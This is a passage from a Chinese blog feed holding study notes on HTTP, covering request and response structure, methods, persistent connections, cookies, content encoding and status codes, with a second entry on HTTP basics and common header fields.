alt="img"></p><p>响应报文基本上是由协议版本、状态码、用以解释状态码的原因短语、可选的响应式头部字段以及实体主体构成</p><p><img src="https://picx.zhimg.com/80/v2-2f86d3626184a4fc8b8fed6008419055_1440w.webp" alt="img"></p><h3 id="1、HTTP是不保存状态的协议"><a href="#1、HTTP是不保存状态的协议" class="headerlink" title="1、HTTP是不保存状态的协议"></a>1、HTTP是不保存状态的协议</h3><p>HTTP协议自身不对请求和响应之间的通信状态进行保存。也就是说在HTTP这个级别，协议对于发送过的请求或响应都不做持久化处理。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把HTTP协议设计成如此简单的。</p><p>HTTP&#x2F;1.1虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了Cookie技术。有了Cookie再用HTTP协议通信，就可以管理状态了。</p><h3 id="2、请求URI定位资源"><a href="#2、请求URI定位资源" class="headerlink" title="2、请求URI定位资源"></a>2、请求URI定位资源</h3><p>HTTP协议使用URI定位互联网上的资源。，在互联网上的任意位置的资源都能访问到。</p><p>当客户端请求访问资源而发送请求时，URI需要将作为请求报文中的请求URI包含在内。指定请求URI的方式有很多。</p><ul><li><p>URI为完整的请求URI</p><blockquote><p>GET <a href="http://hackr.jp/index.html">http://hackr.jp/index.html</a> HTTP&#x2F;1.1</p></blockquote></li><li><p>在首部字段Host中写明网络域名或IP地址</p><blockquote><p>GET index.html HTTP&#x2F;1.1</p><p>Host:hackr.jp</p></blockquote></li></ul><p>除此之外，如果不是访问特定资源而是对服务器本身发起请求，可以用*来代替URI。</p><blockquote><p>OPTIONS * HTTP&#x2F;1.1</p></blockquote><h3 id="3、告知服务器意图的HTTP方法"><a href="#3、告知服务器意图的HTTP方法" class="headerlink" title="3、告知服务器意图的HTTP方法"></a>3、告知服务器意图的HTTP方法</h3><p><strong>GET</strong>：获取资源</p><table><thead><tr><th>请求</th><th align="left">GET &#x2F;index.html HTTP&#x2F;1&#x2F;1<br/>Host:<a href="http://www.hackr.jp/">www.hackr.jp</a></th></tr></thead><tbody><tr><td>响应</td><td align="left">返回index.html的页面资源</td></tr></tbody></table><table><thead><tr><th>请求</th><th align="left">GET &#x2F;index.html HTTP&#x2F;1&#x2F;1 <br/>Host:<a href="www.hackr.jp">www.hackr.jp</a><br/>if-Modified-Since:Thu, 12 Jul 2012 07:30:00 GMT</th></tr></thead><tbody><tr><td>响应</td><td align="left">仅返回2012年7月12日7点30分以后更新过的index.html页面资源。<br/>如果未有页面更新，则以状态码304 Not Modified作为响应返回。</td></tr></tbody></table><p><strong>POST</strong>：传输实体的主体</p><p>虽然GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而是用POST方法。虽说POST功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。</p><table><thead><tr><th>请求</th><th align="left">POST &#x2F;submit.cgi HTTP&#x2F;1&#x2F;1<br /> Host:<a href="www.hackr.jp">www.hackr.jp</a><br />Content-Length: 1560（1560字节的数据）</th></tr></thead><tbody><tr><td>响应</td><td align="left">返回submit,cgi接收数据的处理结果</td></tr></tbody></table><p><strong>PUT</strong>：传输文件</p><p>PUT方法用来传输文件，就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</p><table><thead><tr><th>请求</th><th>PUT &#x2F;example.html HTTP&#x2F;1.1<br />Host:<a href="www.hackr.jp">www.hackr.jp</a><br />Content-Type:text&#x2F;html<br />Content-Length:1560</th></tr></thead><tbody><tr><td>响应</td><td>响应返回状态码204 No Content（该html已存在于服务器上）</td></tr></tbody></table><p><strong>HEAD</strong>：获得报文首部</p><p>HEAD方法和GET方法一样，只是不反悔报文主体部分。用于确认URI的有效性及资源更新的日期时间等。</p><table><thead><tr><th>请求</th><th>HEAD &#x2F;index.html HTTP&#x2F;1.1<br />Host:<a href="http://www.hackr.jp/">www.hackr.jp</a></th></tr></thead><tbody><tr><td>响应</td><td>返回index.html有关的响应首部</td></tr></tbody></table><p><strong>DELETE</strong>：删除文件</p><p>DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。</p><table><thead><tr><th>请求</th><th>DELETE &#x2F;example.html HTTP&#x2F;1.1<br />Host:<a href="http://www.hackr.jp/">www.hackr.jp</a></th></tr></thead><tbody><tr><td>响应</td><td>响应返回状态码204 No Content</td></tr></tbody></table><p><strong>OPTIONS</strong>：询问支持的方法</p><p>OPTION方法用来查询针对请求URI指定的资源支持的方法</p><table><thead><tr><th>请求</th><th>OPTION * HTTP&#x2F;1.1<br />Host:<a href="http://www.hackr.jp/">www.hackr.jp</a></th></tr></thead><tbody><tr><td>响应</td><td>HTTP&#x2F;1.1 200 OK<br />Allow:GET、POST、HEAD、OPTIONS</td></tr></tbody></table><p><strong>TRACE</strong>：追踪路径</p><p>TRACE方法是让Web服务器端将之前的请求通信返回给客户端的方法。</p><p>发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输，最后接收到请求的服务器端则返回状态码200 OK的响应。</p><table><thead><tr><th>请求</th><th>TRACE &#x2F; HTTP&#x2F;1.1<br />Host:hackr.jp<br />Max-Forwards:2</th></tr></thead><tbody><tr><td>响应</td><td>HTTP&#x2F;1.1 200 OK<br />Content-Type:message&#x2F;http<br />Content-Length:1024<br />TRACE &#x2F; HTTP&#x2F;1.1<br />Host:hackr.jp<br />Max-Forwards:2</td></tr></tbody></table><p><strong>CONNECT</strong>：要求用隧道协议连接代理</p><p>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL和TLS协议把通信内容加密后经网络隧道传输。</p><table><thead><tr><th>请求</th><th>CONNECT proxy.hackr.jp:8080 HTTP&#x2F;1.1<br />Host:proxy.hackr.jp</th></tr></thead><tbody><tr><td>响应</td><td>HTTP&#x2F;1.1 200 OK</td></tr></tbody></table><table><thead><tr><th>方法</th><th>说明</th><th>支持的HTTP协议版本</th></tr></thead><tbody><tr><td>GET</td><td>获取资源</td><td>1.0、1.1</td></tr><tr><td>POST</td><td>传输实体主体</td><td>1.0、1.1</td></tr><tr><td>PUT</td><td>传输文件</td><td>1.0、1.1</td></tr><tr><td>HEAD</td><td>获得报文首部</td><td>1.0、1.1</td></tr><tr><td>DELETE</td><td>删除文件</td><td>1.0、1.1</td></tr><tr><td>OPTIONS</td><td>询问支持的方法</td><td>1.1</td></tr><tr><td>TRACE</td><td>追踪路径</td><td>1.1</td></tr><tr><td>CONNECT</td><td>要求用隧道协议连接代理</td><td>1.1</td></tr><tr><td>LINK</td><td>建立和资源之间的联系</td><td>1.0</td></tr><tr><td>UNLINK</td><td>断开连接关系</td><td>1.0</td></tr></tbody></table><h3 id="4、持久连接节省通信"><a href="#4、持久连接节省通信" class="headerlink" title="4、持久连接节省通信"></a>4、持久连接节省通信</h3><p>HTTP协议的初始版本中，每进行一次HTTP通信就要断开一次TCP连接。</p><p>以当年的通信情况来说，因为都是些容量很小的文本传输，所以即使这样也没有多大问题。可随着HTTP的普及，文档中包含大量图片的情况多了起来。</p><p>比如，使用浏览器浏览一个包含多张图片的HTML页面时，在发送请求访问HTML页面资源的同时，也会请求该HTML页面包含的其他资源。因此，每次的请求都会造成无谓的TCP连接建立和断开，增加通信量的开销。</p><h4 id="4-1-持久连接"><a href="#4-1-持久连接" class="headerlink" title="4.1 持久连接"></a>4.1 持久连接</h4><p>为解决上述TCP连接的问题，HTTP&#x2F;1.1和一部分的HTTP&#x2F;1.0想出了持久连接的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持TCP连接状态。</p><p>持久连接的好处在于减少了TCP连接的重复建立和断开所造成的额外开销，减轻了服务器的负载。另外，减少开销的那部分时间，使HTTP请求和响应能够更早地结束，这样Web页面地显示速度也就相应提高了。</p><p>在HTTP&#x2F;1.1中，所有的连接默认都是持久连接，但在HTTP&#x2F;1.0内并未标准化。虽然有一部分服务器通过非标准化的手段实现了持久连接，但服务器端不一定能够支持持久连接。毫无疑问，除了服务器端，客户端也需要支持持久连接。</p><h4 id="4-2-管线化"><a href="#4-2-管线化" class="headerlink" title="4.2 管线化"></a>4.2 管线化</h4><p>持久连接使得多数请求以管线化方式发送成为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。</p><p>比如，当请求一个包含10张图片的HTML Web页面，与挨个连接相比，用持久连接可以让请求更快结束。而管线化技术则比持久连接还要快。请求数越多，时间差就越明显。</p><h3 id="使用Cookie的状态管理"><a href="#使用Cookie的状态管理" class="headerlink" title="使用Cookie的状态管理"></a>使用Cookie的状态管理</h3><p>HTTP是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。</p><p>假设要求登录认证的Web页面本身无法进行状态的管理，那么每次跳转新页面就要再次登录，或者要在每次请求报文中附加参数来管理登录状态。</p><p>保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了Cookie技术，Cookie技术通过在请求和响应报文中写入Cookie信息来控制客户端的状态。</p><p>Cookie会根据从服务端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去。</p><p>服务器端发现客户端发送过来的Cookie后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p><ul><li><p><strong>没有Cookie信息状态下的请求</strong></p><ol><li>发出请求</li><li>在响应中添加Cookie后返回</li></ol></li><li><p><strong>第2次以后（存有Cookie信息状态）的请求</strong></p><ol><li><p>请求中添加Cookie后发送</p></li><li><p>检查Cookie</p></li></ol></li></ul><h2 id="三、HTTP报文内的HTTP信息"><a href="#三、HTTP报文内的HTTP信息" class="headerlink" title="三、HTTP报文内的HTTP信息"></a>三、HTTP报文内的HTTP信息</h2><h3 id="1、HTTP报文"><a href="#1、HTTP报文" class="headerlink" title="1、HTTP报文"></a>1、HTTP报文</h3><p>用于HTTP协议交互的信息被称为HTTP报文。请求端的HTTP报文叫做请求报文，响应端的叫做响应报文。HTTP报文本身是由多行（用CR+LF作换行符）数据构成的字符串文本。</p><p>HTTP报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。</p><h3 id="2、请求报文及响应报文的结构"><a href="#2、请求报文及响应报文的结构" class="headerlink" title="2、请求报文及响应报文的结构"></a>2、请求报文及响应报文的结构</h3><ul><li><p>请求报文</p><ul><li><p>请求行</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET/ HTTP/1.1</span><br></pre></td></tr></table></figure></li><li><p>各首部字段</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Host:hackr.jp</span><br><span class="line">User-Agent:Mozilla/5.0 (window NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language:ja,en-us;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">DNT:1</span><br><span class="line">Connection:keep-alive</span><br><span class="line">Pragma:no-cache</span><br><span class="line">Cache-Control:no-cache</span><br><span class="line">空行(CR+LF)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>响应报文</p><ul><li><p>状态行</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br></pre></td></tr></table></figure></li><li><p>各种首部字段</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Date:fri, 27 Oct 2024 13:14:00 GMT</span><br><span class="line">Server:Apache</span><br><span class="line">Last-Modified:Fri, 31 Aug 2007 02:02:20 GMT</span><br><span class="line">ETag:&quot;45beal-16a-46d776ac&quot;</span><br><span class="line">Accept-Ranges:bytes</span><br><span class="line">Content-Length:362</span><br><span class="line">Connection:close</span><br><span class="line">Content-Type:text/html</span><br><span class="line">空行(CR+LF)</span><br></pre></td></tr></table></figure></li><li><p>报文主体</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>hackr.jp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;hackr.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;hackr.jp&quot;</span> <span class="attr">width</span>=<span class="string">&quot;240&quot;</span> <span class="attr">height</span>=<span class="string">&quot;84&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ol><li><p><em><strong>请求行</strong></em></p><p>包含用于请求的方法，请求URI和HTTP版本</p></li><li><p><em><strong>状态行</strong></em></p><p>包含表明响应结果的状态码，原因短语和HTTP版本</p></li><li><p><em><strong>首部字段</strong></em></p><p>包含表示请求和响应的各种各样条件和属性的各类首部</p><p>一般有4种首部，分别是：通用首部，请求首部，响应首部和实体首部</p></li></ol></li></ul><h3 id="3、编码提升传输速率"><a href="#3、编码提升传输速率" class="headerlink" title="3、编码提升传输速率"></a>3、编码提升传输速率</h3><h4 id="3-1-报文主体和实体主体的差异"><a href="#3-1-报文主体和实体主体的差异" class="headerlink" title="3.1 报文主体和实体主体的差异"></a>3.1 报文主体和实体主体的差异</h4><ul><li><p><em><strong>报文</strong></em></p><p>是HTTP通信中的基本单位，由8位组字节流组成，通过HTTP通信传输</p></li><li><p><em><strong>实体</strong></em></p><p>作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成</p></li></ul><p>HTTP报文的主体用于传输请求或响应的实体主体。</p><p>通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。</p><h4 id="3-2-压缩传输的内容编码"><a href="#3-2-压缩传输的内容编码" class="headerlink" title="3.2 压缩传输的内容编码"></a>3.2 压缩传输的内容编码</h4><p>向待发送邮件内增加附件时，为了使邮件容量变小，我们会先用ZIP压缩文件之后再添加附件发送。HTTP协议中有一种被称为内容编码的功能也能进行类似的操作。</p><p>内容编码指明应用在实体内容上的编码格式，并保持实体信息原样压缩。内容编码后的实体由客户端接收并负责编码。</p><p>常用的内容编码有以下几种。</p><ul><li>gzip（GNU zip）</li><li>compress（UNIX系统的标准压缩）</li><li>deflate（zlib）</li><li>identity（不进行编码）</li></ul><h4 id="3-3-分割发送的分块传输编码"><a href="#3-3-分割发送的分块传输编码" class="headerlink" title="3.3 分割发送的分块传输编码"></a>3.3 分割发送的分块传输编码</h4><p>在HTTP通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面。这种把实体主体分块的功能称为分块传输编码。</p><h4 id="3-4-发送多种数据的多部分对象集合"><a href="#3-4-发送多种数据的多部分对象集合" class="headerlink" title="3.4 发送多种数据的多部分对象集合"></a>3.4 发送多种数据的多部分对象集合</h4><p>发送邮件时，我们可以在邮件里写入文字并添加多份附件。因为采用了MIME机制，允许邮件处理文本、图片、视频等多个不同类型的数据。而在MIME扩展中会使用一种称为多部分对象集合的方法，来容纳多份不同类型的数据。</p><p>相应的，HTTP协议中页采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。</p><p>多部分对象集合包含的对象如下：</p><ul><li><p><strong>multipart&#x2F;form-data</strong></p><p>在Web表单文件上传时使用</p></li><li><p><strong>mulitipart&#x2F;byteranges</strong></p><p>状态码206响应报文包含了多个范围的内容时使用</p></li></ul><p>在HTTP报文中使用多部分对象集合时，需要在首部字段里加上Content-type。</p><p>使用boundary字符串来划分多部分对象集合指明的各类实体。</p><h4 id="3-5-获取部分内容的范围请求"><a href="#3-5-获取部分内容的范围请求" class="headerlink" title="3.5 获取部分内容的范围请求"></a>3.5 获取部分内容的范围请求</h4><p>以前用户不能使用现在这种高速的宽带访问互联网，当时，下载一个尺寸稍大的图片或文件就已经很吃力了。如果下载过程中遇到网络中断的情况，那就必须重头开始。为了解决上述问题，需要一种可恢复的机制。所谓恢复是指能从之前下载中断处恢复下载。</p><p>要实现该功能需要指定下载的实体范围。指定范围发送的请求叫做范围请求。执行范围请求时，会用到首部字段Range来指定资源的byte范围。</p><h4 id="3-6-内容协商返回最合适的内容"><a href="#3-6-内容协商返回最合适的内容" class="headerlink" title="3.6 内容协商返回最合适的内容"></a>3.6 内容协商返回最合适的内容</h4><p>同一个Web网站有可能存在着多份相同内容的页面。比如英语版和中文版的Web页面，他们内容上虽然相同，但使用的语言却不同。</p><p>当浏览器的默认语言为英语或中文，访问相同URI的Web页面时，则会显示对应的英语版或中文版的Web页面。这样的机制称为内容协商。</p><p>内容协商机制是指客户端和服务端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以语言、字符集、编码方式等为基准判断响应的资源</p><ul><li>Accept</li><li>Accept-Charset</li><li>Accept-Encoding</li><li>Accept-Language</li><li>Content-Language</li></ul><p>内容协商技术有以下3种类型。</p><p><strong>服务器驱动协商</strong></p><p><strong>客户端驱动协商</strong></p><p><strong>透明协商</strong>：是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种方法。</p><h3 id="4、返回结果的HTTP状态码"><a href="#4、返回结果的HTTP状态码" class="headerlink" title="4、返回结果的HTTP状态码"></a>4、返回结果的HTTP状态码</h3><h4 id="4-1-状态码告知从服务器端返回的请求结果"><a href="#4-1-状态码告知从服务器端返回的请求结果" class="headerlink" title="4.1 状态码告知从服务器端返回的请求结果"></a>4.1 状态码告知从服务器端返回的请求结果</h4><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational（信息性状态码）</td><td>接受的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table><h4 id="4-2-2XX-成功"><a href="#4-2-2XX-成功" class="headerlink" title="4.2 2XX 成功"></a>4.2 2XX 成功</h4><p>2XX的响应结果表明请求被正常处理了</p><p><strong>4.2.1 200OK</strong> </p><p>表示从客户端发来的请求在服务器端被正常处理了。</p><p><strong>4.2.2 204 No Content</strong></p><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p><p><strong>4.2.3 206 Partial Content</strong></p><p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。</p><h4 id="4-3-3XX-重定向"><a href="#4-3-3XX-重定向" class="headerlink" title="4.3 3XX 重定向"></a>4.3 3XX 重定向</h4><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确处理</p><p><strong>4.3.1 301 Moved Parmanently</strong></p><p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。也就是说，如果已经把资源对应的URI保存为书签了，这时应该按Location首部字段提示的URI重新保存。</p><p><strong>4.3.2 302 Found</strong></p><p>临时重定向。该状态码表示请求的资源已被分配了新的URI，希望用户能使用新的URI访问。</p><p><strong>4.3.3 303 See Other</strong></p><p>该状态码表示由于请求对应的资源存在着另一个URI，应使用<strong>GET</strong>方法定向获取请求的资源。</p><p><strong>4.3.4 304 Not Modified</strong></p><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但因发送请求未满足条件的情况后，直接返回304，返回时，不包含任何响应的主体部分。304虽然被划分在3XX类别中，但是和重定向没有关系。</p><p><strong>4.3.5 307 Temporary Redirect</strong></p><p>临时重定向。该状态码与302有着相同的含义，尽管302标准禁止POST变换成GET，但实际使用时大家并不遵守。</p><h4 id="4-4-4XX-客户端错误"><a href="#4-4-4XX-客户端错误" class="headerlink" title="4.4 4XX 客户端错误"></a>4.4 4XX 客户端错误</h4><p>4XX的响应结果表明客户端是发生错误的原因所在</p><p><strong>4.4.1 400 Bad Request</strong></p><p>该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200OK一样对待该状态码。</p><p><strong>4.4.2 401 Unauthorized</strong></p><p>该状态码表示发送的请求需要通过HTTP认证的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。</p><p>返回含有401的响应必须包含一个适用于被请求资源的www-authenticate首部用以质询用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。</p><p><strong>4.4.3 403 Forbidden</strong></p><p>该状态码表明对请求的访问被服务器拒绝。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。</p><p><strong>4.4.4 404 Not Found</strong></p><p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p><h4 id="4-5-5XX-服务器错误"><a href="#4-5-5XX-服务器错误" class="headerlink" title="4.5 5XX 服务器错误"></a>4.5 5XX 服务器错误</h4><p><strong>4.5.1 500 Internal Server Error</strong></p><p>该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时故障</p><p><strong>4.5.2 503 Service Unavailable</strong></p><p>该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、了解Web及网络基础&quot;&gt;&lt;a href=&quot;#一、了解Web及网络基础&quot; class=&quot;headerlink&quot; title=&quot;一、了解Web及网络基础&quot;&gt;&lt;/a&gt;一、了解Web及网络基础&lt;/h2&gt;&lt;h3 id=&quot;1、网络基础TCP-IP&quot;&gt;&lt;a href=&quot;#1</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>HTTP篇</title>
    <link href="http://cychenhaibin.github.io/2024/10/19/HTTP%E7%AF%87/"/>
    <id>http://cychenhaibin.github.io/2024/10/19/HTTP%E7%AF%87/</id>
    <published>2024-10-19T03:43:47.000Z</published>
    <updated>2024-11-03T01:43:11.891Z</updated>
    
    <content type="html"><![CDATA[<p><strong>看本篇文章之前应先去看我的图解HTTP的博客</strong></p><h2 id="2024-10-19"><a href="#2024-10-19" class="headerlink" title="2024.10.19"></a>2024.10.19</h2><p><img src="https://cdn.xiaolincoding.com//mysql/other/6b9bfd38d2684b3f9843ebabf8771212.png" alt="提纲"></p><h3 id="HTTP基本概念"><a href="#HTTP基本概念" class="headerlink" title="HTTP基本概念"></a>HTTP基本概念</h3><p>HTTP 是超文本传输协议，也就是<strong>H</strong>yperText <strong>T</strong>ransfer <strong>P</strong>rotocol。</p><p>HTTP 的名字「超文本协议传输」，它可以拆成三个部分：</p><ul><li>超文本</li><li>传输</li><li>协议</li></ul><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/3-HTTP%E4%B8%89%E9%83%A8%E5%88%86.png" alt="三个部分"></p><ol><li><h4 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h4><p>HTTP 是一个用在计算机世界里的<strong>协议</strong>。它使用计算机能够理解的语言确立了一种计算机之间交流通信的规范（<strong>两个以上的参与者</strong>），以及相关的各种控制和错误处理方式（<strong>行为约定和规范</strong>）。</p></li><li><h4 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h4><p>HTTP 协议是一个<strong>双向协议</strong>。</p><p>在上网冲浪时，浏览器是请求方 A，百度网站就是应答方 B。双方约定用 HTTP 协议来通信，于是浏览器把请求数据发送给网站，网站再把一些数据返回给浏览器，最后由浏览器渲染在屏幕，就可以看到图片、视频了。</p><p>HTTP 是一个在计算机世界里专门用来在<strong>两点之间传输数据</strong>的约定和规范。</p></li><li><h4 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h4><p>HTTP 传输的内容是「超文本」。</p><p>「超文本」，它就是<strong>超越了普通文本的文本</strong>，它是文字、图片、视频等的混合体，最关键有超链接，能从一个超文本跳转到另外一个超文本。</p><p>HTML 就是最常见的超文本了，它本身只是纯文字文件，但内部用很多标签定义了图片、视频等的链接，再经过浏览器的解释，呈现给我们的就是一个文字、有画面的网页了。</p></li></ol><p><strong>HTTP 是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」。</strong></p><h3 id="HTTP-常见的状态码有哪些？"><a href="#HTTP-常见的状态码有哪些？" class="headerlink" title="HTTP 常见的状态码有哪些？"></a>HTTP 常见的状态码有哪些？</h3><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/6-%E4%BA%94%E5%A4%A7%E7%B1%BBHTTP%E7%8A%B6%E6%80%81%E7%A0%81.png" alt=" 五大类 HTTP 状态码 "></p><p><code>1xx</code> 类状态码属于<strong>提示信息</strong>，是协议处理中的一种中间状态，实际用到的比较少。</p><p><code>2xx</code> 类状态码表示服务器<strong>成功</strong>处理了客户端的请求，也是我们最愿意看到的状态。</p><ul><li>「<strong>200 OK</strong>」是最常见的成功状态码，表示一切正常。如果是非 <code>HEAD</code> 请求，服务器返回的响应头都会有 body 数据。</li><li>「<strong>204 No Content</strong>」也是常见的成功状态码，与 200 OK 基本相同，但响应头没有 body 数据。</li><li>「<strong>206 Partial Content</strong>」是应用于 HTTP 分块下载或断点续传，表示响应返回的 body 数据并不是资源的全部，而是其中的一部分，也是服务器处理成功的状态。</li></ul><p><code>3xx</code> 类状态码表示客户端请求的资源发生了变动，需要客户端用新的 URL 重新发送请求获取资源，也就是<strong>重定向</strong>。</p><ul><li>「<strong>301 Moved Permanently</strong>」表示永久重定向，说明请求的资源已经不存在了，需改用新的 URL 再次访问。</li><li>「<strong>302 Found</strong>」表示临时重定向，说明请求的资源还在，但暂时需要用另一个 URL 来访问。</li></ul><p>301 和 302 都会在响应头里使用字段 <code>Location</code>，指明后续要跳转的 URL，浏览器会自动重定向新的 URL。</p><ul><li>「<strong>304 Not Modified</strong>」不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称缓存重定向，也就是告诉客户端可以继续使用缓存资源，用于缓存控制。</li></ul><p><code>4xx</code> 类状态码表示客户端发送的<strong>报文有误</strong>，服务器无法处理，也就是错误码的含义。</p><ul><li>「<strong>400 Bad Request</strong>」表示客户端请求的报文有错误，但只是个笼统的错误。</li><li>「<strong>403 Forbidden</strong>」表示服务器禁止访问资源，并不是客户端的请求出错。</li><li>「<strong>404 Not Found</strong>」表示请求的资源在服务器上不存在或未找到，所以无法提供给客户端。</li></ul><p><code>5xx</code> 类状态码表示客户端请求报文正确，但是<strong>服务器处理时内部发生了错误</strong>，属于服务器端的错误码。</p><ul><li><p>「<strong>500 Internal Server Error</strong>」与 400 类型，是个笼统通用的错误码，服务器发生了什么错误，我们并不知道。</p></li><li><p>「<strong>501 Not Implemented</strong>」表示客户端请求的功能还不支持，类似“即将开业，敬请期待”的意思。</p></li><li><p>「<strong>502 Bad Gateway</strong>」通常是服务器作为网关或代理时返回的错误码，表示服务器自身工作正常，访问后端服务器发生了错误。</p></li><li><p>「<strong>503 Service Unavailable</strong>」表示服务器当前很忙，暂时</p></li><li><p>无法响应客户端，类似“网络服务正忙，请稍后重试”的意思。</p></li></ul><h3 id="HTTP-常见字段有哪些？"><a href="#HTTP-常见字段有哪些？" class="headerlink" title="HTTP 常见字段有哪些？"></a>HTTP 常见字段有哪些？</h3><ol><li><h4 id="Host-字段"><a href="#Host-字段" class="headerlink" title="Host 字段"></a><em>Host</em> 字段</h4><p>客户端发送请求时，用来指定服务器的域名。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/7-HOST%E5%AD%97%E6%AE%B5.png" alt="img"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.A.com</span><br></pre></td></tr></table></figure><p>有了 <code>Host</code> 字段，就可以将请求发往「同一台」服务器上的不同网站。</p></li><li><h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a><em>Content-Length 字段</em></h4><p>服务器在返回数据时，会有 <code>Content-Length</code> 字段，表明本次回应的数据长度。</p><p><img 